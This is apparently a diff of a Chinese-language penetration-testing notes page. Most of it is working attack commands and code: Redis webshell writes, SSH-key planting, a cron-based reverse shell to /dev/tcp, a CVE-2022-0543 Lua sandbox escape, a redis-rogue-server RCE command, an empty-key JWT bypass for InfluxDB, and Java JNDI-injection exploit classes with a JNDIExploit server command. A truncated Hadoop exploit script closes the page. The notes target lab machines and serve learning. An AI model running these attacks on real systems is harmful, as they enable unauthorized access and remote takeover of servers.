-<p><img src="/2023/05/19/Security/%E6%B8%97%E9%80%8F/image-20221003110807493.png" srcset="/img/loading.gif" lazyload alt="image-20221003110807493"></p>
+<figure>
+<img src="/2023/05/19/Security/%E6%B8%97%E9%80%8F/image-20221003110807493.png" srcset="/img/loading.gif" lazyload alt="image-20221003110807493">
+<figcaption aria-hidden="true">image-20221003110807493</figcaption>
+</figure>
 </blockquote>
-<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><blockquote>
-<img src="/2023/05/19/Security/%E6%B8%97%E9%80%8F/image-20221003110648111.png" srcset="/img/loading.gif" lazyload alt="image-20221003110648111" style="zoom: 80%;">
-
-<h2 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h2><p>注：redis不区分大小写</p>
+<h3 id="redis">Redis</h3>
+<blockquote>
+<p><img src="/2023/05/19/Security/%E6%B8%97%E9%80%8F/image-20221003110648111.png" srcset="/img/loading.gif" lazyload alt="image-20221003110648111" style="zoom: 80%;"></p>
+<h2 id="常见命令">常见命令</h2>
+<p>注：redis不区分大小写</p>
 <figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs maxima">keys * 获取数据库中所有的键<br><span class="hljs-built_in">save</span> 进行一次备份操作<br>flushall 清除所有数据<br><span class="hljs-built_in">del</span> <span class="hljs-built_in">key</span> 删除数据<br></code></pre></td></tr></table></figure>
-
-<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>安全模式起作用需要同时满足两个条件：</p>
+<h2 id="配置文件">配置文件</h2>
+<p>安全模式起作用需要同时满足两个条件：</p>
 <ul>
 <li>redis没有开启登录认证</li>
 <li>redis没有绑定ip</li>
 </ul>
 <p>redis默认是未开启认证，开启安全模式的</p>
-<h2 id="未授权访问应用条件"><a href="#未授权访问应用条件" class="headerlink" title="未授权访问应用条件"></a>未授权访问应用条件</h2><ol>
+<h2 id="未授权访问应用条件">未授权访问应用条件</h2>
+<ol type="1">
 <li>bind 127.0.0.1 处于注释状态</li>
 <li>protected-mode no</li>
 <li>requirepass 处于注释状态</li>
 </ol>
-<h2 id="写Webshell"><a href="#写Webshell" class="headerlink" title="写Webshell"></a>写Webshell</h2><p>应用条件：知道Web目录，并且可读写</p>
+<h2 id="写webshell">写Webshell</h2>
+<p>应用条件：知道Web目录，并且可读写</p>
 <figure class="highlight plaintext"><figcaption><span>set dir</span><a href="/tmp">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs config">config set dir /var/www/html<br>config set dbfilename 1.php<br>set test "&lt;?php phpinfo();?&gt;"<br>bgsave # 保存执行<br>save # 保存执行<br>注意:部分目录没有读写权限<br></code></pre></td></tr></table></figure>
-
-<h2 id="写入RSA秘钥"><a href="#写入RSA秘钥" class="headerlink" title="写入RSA秘钥"></a>写入RSA秘钥</h2><p>前提条件</p>
+<h2 id="写入rsa秘钥">写入RSA秘钥</h2>
+<p>前提条件</p>
 <ul>
 <li>redis以root账号启动</li>
 <li>服务器必须允许密钥登陆</li>
 <li>protected-mode处于关闭状态</li>
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">config set dir /root/.ssh/<br>config set dbfilename authorized_keys<br>set x "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBe/UsMlJRIL+Z4w0DTr9nRmKu8Tt9cPoKj/t7fOHWItBPxMaVryrq732nIkZlCrtpJNkZJsfN9Fq2oGHyA/x3qrXBjhNiFUx2NTRHPlcfVMfTf+XB34oa4eAHOEWpkxCDZe+W0nV3va8sp7poSQqA+GD+YmidZ8dR57TQdfnTTFB9SIW7DZBATRseUzf/PtPRTVh7Jn/963M/JHVhV+OHXJ0BRCvu0YBg/oqxPkWJ41kZOZJP6KfDVICgoERgULRdnYWLNUUNlLOQ4LPDG3fhQHJgN2L9hqjf0bk5Zx5ZA9Uy093AAdkyElY2rkxeN9hwOZT/YFEbvUAT0v2kDtf1TM8lfuO3ibD2j9Pxetv/jUKNthliSmdeB/+tD6hkJ6/mdjvoIgqATY2YlEIM7YYTAZ4mVaqAbYKx3HHDRlj7Jd2wUEGuOFcuzvqIsIHTfSzcydvUBW04zLUKAl/Zacp0mi+wmbgyX3gZYO6nhFCjmQPaO2KyNLrArYepWifDnlk= d4wn@D4wn\n\n\n"<br>或者<br>(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") &gt; foo.txt<br>cat foo.txt | redis-cli -h x.x.x.x -x set crackit<br>save<br></code></pre></td></tr></table></figure>
-
-<h2 id="写定时任务反弹shell"><a href="#写定时任务反弹shell" class="headerlink" title="写定时任务反弹shell"></a>写定时任务反弹shell</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /var/spool/cron</span><br>config set dbfilename root #必须是root<br>set xx  "\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.52.128/4444 0&gt;&amp;1\n\n"<br>save<br></code></pre></td></tr></table></figure>
-
-<h2 id="CVE-2022-0543-沙箱绕过"><a href="#CVE-2022-0543-沙箱绕过" class="headerlink" title="CVE-2022-0543-沙箱绕过"></a>CVE-2022-0543-沙箱绕过</h2><p>攻击机:172.30.152.248</p>
+<h2 id="写定时任务反弹shell">写定时任务反弹shell</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /var/spool/cron</span><br>config set dbfilename root #必须是root<br>set xx  "\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.52.128/4444 0&gt;&amp;1\n\n"<br>save<br></code></pre></td></tr></table></figure>
+<h2 id="cve-2022-0543-沙箱绕过">CVE-2022-0543-沙箱绕过</h2>
+<p>攻击机:172.30.152.248</p>
 <p>靶机:172.30.158.168</p>
-<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>2.2 &lt;= redis &lt; 5.0.13<br>2.2 &lt;= redis &lt; 6.0.15<br>2.2 &lt;= redis &lt; 6.2.5</p>
-<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;<span class="hljs-built_in">eval</span> <span class="hljs-string">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res'</span> 0<br></code></pre></td></tr></table></figure>
-
-<h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p><img src="/2023/05/19/Security/%E6%B8%97%E9%80%8F/image-20221003110605703.png" srcset="/img/loading.gif" lazyload alt="image-20221003110605703"></p>
-<p><img src="/2023/05/19/Security/%E6%B8%97%E9%80%8F/image-20221003110613237.png" srcset="/img/loading.gif" lazyload alt="image-20221003110613237"></p>
-<h2 id="RCE-主从复制getshell"><a href="#RCE-主从复制getshell" class="headerlink" title="RCE-主从复制getshell"></a>RCE-主从复制getshell</h2><p>主从模式为使用两台Redis主机,一台为主机,一台为从机,一台负责读,一台负责写,主从模式的读写分离可以缓解服务器上的流量压力,牺牲空间换取效率.</p>
-<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>Redis 版本(4.x~5.0.5)（新增模块功能，可以通过C语言并编译出恶意.so文件）</p>
-<h3 id="先决条件："><a href="#先决条件：" class="headerlink" title="先决条件："></a>先决条件：</h3><p>Redis 版本(4.x~5.0.5)（新增模块功能，可以通过C语言并编译出恶意.so文件）</p>
+<h3 id="影响版本">影响版本</h3>
+<p>2.2 &lt;= redis &lt; 5.0.13 2.2 &lt;= redis &lt; 6.0.15 2.2 &lt;=
+redis &lt; 6.2.5</p>
+<h3 id="exp-1">exp</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;<span class="hljs-built_in">eval</span> <span class="hljs-string">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res'</span> 0<br></code></pre></td></tr></table></figure>
+<h3 id="复现-1">复现</h3>
+<figure>
+<img src="/2023/05/19/Security/%E6%B8%97%E9%80%8F/image-20221003110605703.png" srcset="/img/loading.gif" lazyload alt="image-20221003110605703">
+<figcaption aria-hidden="true">image-20221003110605703</figcaption>
+</figure>
+<figure>
+<img src="/2023/05/19/Security/%E6%B8%97%E9%80%8F/image-20221003110613237.png" srcset="/img/loading.gif" lazyload alt="image-20221003110613237">
+<figcaption aria-hidden="true">image-20221003110613237</figcaption>
+</figure>
+<h2 id="rce-主从复制getshell">RCE-主从复制getshell</h2>
+<p>主从模式为使用两台Redis主机,一台为主机,一台为从机,一台负责读,一台负责写,主从模式的读写分离可以缓解服务器上的流量压力,牺牲空间换取效率.</p>
+<h3 id="漏洞成因">漏洞成因</h3>
+<p>Redis
+版本(4.x~5.0.5)（新增模块功能，可以通过C语言并编译出恶意.so文件）</p>
+<h3 id="先决条件">先决条件：</h3>
+<p>Redis
+版本(4.x~5.0.5)（新增模块功能，可以通过C语言并编译出恶意.so文件）</p>
 <p>root权限启动redis</p>
 <p>自动化脚本：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<p>https://github.com/n0b0dyCN/redis-rogue-server</p>
 <p><code>python redis-rogue-server.py --rhost 192.168.52.251 --lhost 192.168.52.128</code></p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.t00ls.com/articles-54620.html#tls22">redis未授权访问个人总结 - T00ls.Com</a></p>
-<p><a target="_blank" rel="noopener" href="https://inhann.top/2021/09/14/redis_master_slave_rce/#%E7%8E%AF%E5%A2%83">https://inhann.top/2021/09/14/redis_master_slave_rce/#%E7%8E%AF%E5%A2%83</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/303910.html">https://www.freebuf.com/articles/web/303910.html</a></p>
+<h2 id="参考链接">参考链接</h2>
+<p><a target="_blank" rel="noopener" href="https://www.t00ls.com/articles-54620.html#tls22">redis未授权访问个人总结
+- T00ls.Com</a></p>
+<p>https://inhann.top/2021/09/14/redis_master_slave_rce/#%E7%8E%AF%E5%A2%83</p>
+<p>https://www.freebuf.com/articles/web/303910.html</p>
 </blockquote>
-<h3 id="InfluxDB"><a href="#InfluxDB" class="headerlink" title="InfluxDB"></a>InfluxDB</h3><p><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/InfluxDB%20JWT%20%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2019-20933.md">https://github.com/Threekiii/Vulhub-Reproduce/blob/master/InfluxDB%20JWT%20%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2019-20933.md</a></p>
-<h4 id="CVE-2019-20933"><a href="#CVE-2019-20933" class="headerlink" title="CVE-2019-20933"></a>CVE-2019-20933</h4><p>认证绕过漏洞</p>
+<h3 id="influxdb">InfluxDB</h3>
+<p>https://github.com/Threekiii/Vulhub-Reproduce/blob/master/InfluxDB%20JWT%20%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2019-20933.md</p>
+<h4 id="cve-2019-20933">CVE-2019-20933</h4>
+<p>认证绕过漏洞</p>
 <p>漏洞原理: 使用JWT鉴权，但是JWT默认密钥为空字符串，因此可以绕过</p>
-<p>利用<a target="_blank" rel="noopener" href="https://jwt.io可以构造key为空的jwt/">https://jwt.io可以构造Key为空的JWT</a></p>
+<p>利用https://jwt.io可以构造Key为空的JWT</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">{</span><br>  <span class="hljs-attr">"alg"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"HS256"</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">"typ"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"JWT"</span><br><span class="hljs-punctuation">}</span><br><span class="hljs-punctuation">{</span><br>  <span class="hljs-attr">"username"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"admin"</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">"exp"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1998787794</span><br><span class="hljs-punctuation">}</span><br></code></pre></td></tr></table></figure>
-
 <p>构造POST包</p>
-<p><img src="/2023/05/19/Security/%E6%B8%97%E9%80%8F/image-20231021004032855.png" srcset="/img/loading.gif" lazyload alt="image-20231021004032855"></p>
+<figure>
+<img src="/2023/05/19/Security/%E6%B8%97%E9%80%8F/image-20231021004032855.png" srcset="/img/loading.gif" lazyload alt="image-20231021004032855">
+<figcaption aria-hidden="true">image-20231021004032855</figcaption>
+</figure>
 <p>或者构造GET包</p>
-<p><img src="/2023/05/19/Security/%E6%B8%97%E9%80%8F/image-20231021005852825.png" srcset="/img/loading.gif" lazyload alt="image-20231021005852825"></p>
+<figure>
+<img src="/2023/05/19/Security/%E6%B8%97%E9%80%8F/image-20231021005852825.png" srcset="/img/loading.gif" lazyload alt="image-20231021005852825">
+<figcaption aria-hidden="true">image-20231021005852825</figcaption>
+</figure>
 <p>JWT相关知识</p>
 <blockquote>
 <p>分为三部分：</p>
@@ -794,37 +795,35 @@ mjx-container[display="true"] + br {
 </ul>
 <p>Header：</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">{</span><br>  <span class="hljs-attr">"alg"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"HS256"</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">"typ"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"JWT"</span><br><span class="hljs-punctuation">}</span><br></code></pre></td></tr></table></figure>
-
 <p>Payload：</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">{</span><br>  <span class="hljs-attr">"iss"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"发布者"</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">"aud"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"受众"</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">"iat"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"时间戳"</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">"exp"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"过期时间"</span><br><span class="hljs-punctuation">}</span><br></code></pre></td></tr></table></figure>
-
 <p>Signature:</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">HMACSHA256(<br>  base64UrlEncode(header) + <span class="hljs-string">"."</span> +<br>  base64UrlEncode(payload)<span class="hljs-punctuation">,</span><br>  your<span class="hljs-number">-256</span>-bit-secret<br>) <br></code></pre></td></tr></table></figure>
 </blockquote>
 <p>HTTP身份验证</p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication</a></p>
-<ol>
-<li><p>服务端–&gt;客户端：401未授权状态码</p>
+<p>https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication</p>
+<ol type="1">
+<li><p>服务端--&gt;客户端：401未授权状态码</p>
 <p>在下面的标头里提供质询方式</p>
 <p>realm用来描述进行保护的区域，这样用户就可以知道他正在试图访问什么</p>
-<p><code>WWW-Authenticate: Basic realm="InfluxDB"</code></p>
-</li>
-<li><p>客户端–&gt;服务端：<code>Authorization</code>请求头</p>
+<p><code>WWW-Authenticate: Basic realm="InfluxDB"</code></p></li>
+<li><p>客户端--&gt;服务端：<code>Authorization</code>请求头</p>
 <ul>
 <li>Basic：对用户名和密码进行Base64编码</li>
 <li>Bearer：通常用于OAuth2.0认证</li>
 <li>Digest：发送经过哈希处理后的凭证</li>
-</ul>
-</li>
+</ul></li>
 </ol>
 </blockquote>
-<h3 id="H2Database"><a href="#H2Database" class="headerlink" title="H2Database"></a>H2Database</h3><h4 id="h2-console-unacc"><a href="#h2-console-unacc" class="headerlink" title="h2-console-unacc"></a>h2-console-unacc</h4><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/h2database/h2-console-unacc/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/h2database/h2-console-unacc/README.zh-cn.md</a></p>
+<h3 id="h2database">H2Database</h3>
+<h4 id="h2-console-unacc">h2-console-unacc</h4>
+<p>https://github.com/vulhub/vulhub/blob/master/h2database/h2-console-unacc/README.zh-cn.md</p>
 <p>JNDI注入</p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12277">https://xz.aliyun.com/t/12277</a></p>
-<p><a target="_blank" rel="noopener" href="https://evilpan.com/2021/12/13/jndi-injection/">https://evilpan.com/2021/12/13/jndi-injection/</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Ne4y1o7ch?t=123.7">https://www.bilibili.com/video/BV1Ne4y1o7ch?t=123.7</a></p>
+<p>https://xz.aliyun.com/t/12277</p>
+<p>https://evilpan.com/2021/12/13/jndi-injection/</p>
+<p>https://www.bilibili.com/video/BV1Ne4y1o7ch?t=123.7</p>
 <p>JNDI(Java Naming and Directory Interface)：Java名称与目录接口</p>
 <p>SPI(Service Provider Interface)：服务供应接口</p>
 <ul>
@@ -833,7 +832,7 @@ mjx-container[display="true"] + br {
 </ul>
 <table>
 <thead>
-<tr>
+<tr class="header">
 <th></th>
 <th>JDK6</th>
 <th>JDK7</th>
@@ -841,51 +840,54 @@ mjx-container[display="true"] + br {
 <th>JDK11</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr class="odd">
 <td>RMI可用</td>
 <td>6u132以下</td>
 <td>7u122以下</td>
 <td>8u113以下</td>
 <td>无</td>
 </tr>
-<tr>
+<tr class="even">
 <td>LDAP可用</td>
 <td>6u211以下</td>
 <td>7u201以下</td>
 <td>8u191以下</td>
 <td>11.0.1以下</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p>因此LDAP适用范围更广</p>
 <p>dns常用于探测漏洞是否存在</p>
 <p>漏洞端：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[]args)</span> <span class="hljs-keyword">throws</span> Exception{<br>        <span class="hljs-type">String</span> <span class="hljs-variable">string</span> <span class="hljs-operator">=</span> <span class="hljs-string">"rmi://127.0.0.1:1099/hello"</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(string);<br>    }<br>}<br></code></pre></td></tr></table></figure>
-
 <p>Server端：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMI_Server_Reference</span> {<br>     <span class="hljs-keyword">void</span> <span class="hljs-title function_">register</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception{<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">"RMIHello"</span>,<span class="hljs-string">"RMIHello"</span>,<span class="hljs-string">"http://127.0.0.1:8888/"</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">refObjWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        Naming.bind(<span class="hljs-string">"rmi://127.0.0.1:1099/hello"</span>,refObjWrapper);<br>        System.out.println(<span class="hljs-string">"Registry......"</span>);<br>    }<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMI_Server_Reference</span>().register();<br>    }<br>}<br></code></pre></td></tr></table></figure>
-
 <p>Exp:</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.Name;<br><span class="hljs-keyword">import</span> javax.naming.spi.ObjectFactory;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br> <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIHello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RMIHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException {<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-keyword">try</span> {<br>            Runtime.getRuntime().exec(<span class="hljs-string">"calc"</span>);<br>        } <span class="hljs-keyword">catch</span> (IOException e) {<br>            e.printStackTrace();<br>        }<br>    }<br> <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> RemoteException {<br>        System.out.println(<span class="hljs-string">"Hello World!"</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    }<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="hljs-keyword">throws</span> Exception {<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    }<br> <br>}<br></code></pre></td></tr></table></figure>
-
 <p>若使用工具：</p>
 <p>漏洞端：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[]args)</span> <span class="hljs-keyword">throws</span> Exception{<br>        <span class="hljs-type">String</span> <span class="hljs-variable">string</span> <span class="hljs-operator">=</span> <span class="hljs-string">"ldap://47.108.90.224:55590/Basic/Command/calc"</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(string);<br>    }<br>}<br></code></pre></td></tr></table></figure>
-
 <p>Server端：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 47.108.90.224 -l 55590 -p 55591<br></code></pre></td></tr></table></figure>
-
-<p><img src="/2023/05/19/Security/%E6%B8%97%E9%80%8F/image-20231022200745941.png" srcset="/img/loading.gif" lazyload alt="image-20231022200745941"></p>
-<p><img src="/2023/05/19/Security/%E6%B8%97%E9%80%8F/image-20231022200823615.png" srcset="/img/loading.gif" lazyload alt="image-20231022200823615"></p>
+<figure>
+<img src="/2023/05/19/Security/%E6%B8%97%E9%80%8F/image-20231022200745941.png" srcset="/img/loading.gif" lazyload alt="image-20231022200745941">
+<figcaption aria-hidden="true">image-20231022200745941</figcaption>
+</figure>
+<figure>
+<img src="/2023/05/19/Security/%E6%B8%97%E9%80%8F/image-20231022200823615.png" srcset="/img/loading.gif" lazyload alt="image-20231022200823615">
+<figcaption aria-hidden="true">image-20231022200823615</figcaption>
+</figure>
 <p>避坑：</p>
 <ul>
 <li><code>-i</code>参数后面若跟上<code>0.0.0.0</code>则复现失败</li>
 <li>若把虚拟机当做服务端则复现失败</li>
 </ul>
 </blockquote>
-<h3 id="Haddop"><a href="#Haddop" class="headerlink" title="Haddop"></a>Haddop</h3><blockquote>
-<p>靶场:<a target="_blank" rel="noopener" href="https://vulfocus.cn/">https://vulfocus.cn</a></p>
+<h3 id="haddop">Haddop</h3>
+<blockquote>
+<p>靶场:https://vulfocus.cn</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># Hadoop未授权访问exp</span><br><br><span class="hljs-comment"># --------------------------设置参数-----------------------------------------------------------------------------</span><br>target = <span class="hljs-string">'http://172.30.158.168:8088/'</span>  <span class="hljs-comment"># 靶机</span><br>lhost = <span class="hljs-string">'120.53.236.54'</span>  <span 